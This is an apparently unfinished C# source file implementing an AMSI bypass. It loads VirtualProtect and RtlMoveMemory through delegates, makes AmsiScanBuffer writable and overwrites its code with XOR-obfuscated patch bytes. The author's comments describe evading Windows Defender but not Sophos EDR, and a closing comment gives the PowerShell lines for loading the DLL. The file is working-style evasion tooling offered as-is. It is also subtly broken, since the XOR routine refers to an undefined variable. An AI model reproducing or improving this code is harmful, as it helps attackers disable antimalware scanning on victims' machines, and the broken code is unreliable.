//WORK IN PROGRESS!!
//amsi bypass with delegate functions for RtlMoveMemory and VirtualProtect
//bypasses defender with aes encryption but NOT sophos EDR, more testing needed
//if i intentionally send the wrong bytes to be patched EDR still detects


using System;
using System.Runtime.InteropServices;

namespace B
{
    public class A
    {
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr mvmem
        (IntPtr dest, IntPtr src, int size);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr vproc
        (IntPtr lpAddress, uint dwSize,
                uint flNewProtect, IntPtr lpflOldProtect);


        public static int Main()
        {
      
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            IntPtr AmsiScanBufrPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer"); //yes this needs to go but i'm tired RN
            IntPtr OldProtection = Marshal.AllocHGlobal(4);


            string DllName = "kernel32.dll";
            string FuncName = "VirtualProtect";
            IntPtr hModule = LoadLibrary(DllName);
            IntPtr intPtr = GetProcAddress(hModule, FuncName);
            vproc vp = (vproc)Marshal.GetDelegateForFunctionPointer(intPtr, typeof(vproc));
            vp(AmsiScanBufrPtr, 0x0015, 0x40, OldProtection);

            string DllName2 = "kernel32.dll";
            string FuncName2 = "RtlMoveMemory";
            IntPtr hModule2 = LoadLibrary(DllName2);
            IntPtr intPtr2 = GetProcAddress(hModule2, FuncName2);
            mvmem mm = (mvmem)Marshal.GetDelegateForFunctionPointer(intPtr2, typeof(mvmem));
            
            //Byte[] Patch = { 0x31, 0xff, 0x90 };
            Byte[] xPatch = { 0x50, 0x8c, 0xf6 };
            var xkey = "asfgkqpaldjdjhs";
            byte[] Patch = XORCipher(xPatch, xkey);
            
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);


            mm(AmsiScanBufrPtr + 0x001b, unmanagedPointer, 3);
            return 0;
        }
        static byte[] XORCipher(byte[] xpatch, string xkey)
        {
            int patchLen = patch.Length;
            int xkeyLen = xkey.Length;
            byte[] output = new byte[patchLen];

            for (int i = 0; i < patchLen; ++i)
            {
                output[i] = (byte)(patch[i] ^ xkey[i]);
            }

            return output;
        }
    }
}


//[System.Reflection.Assembly]::LoadFile("amsi_bypass.dll")
//[B.A]::Main()
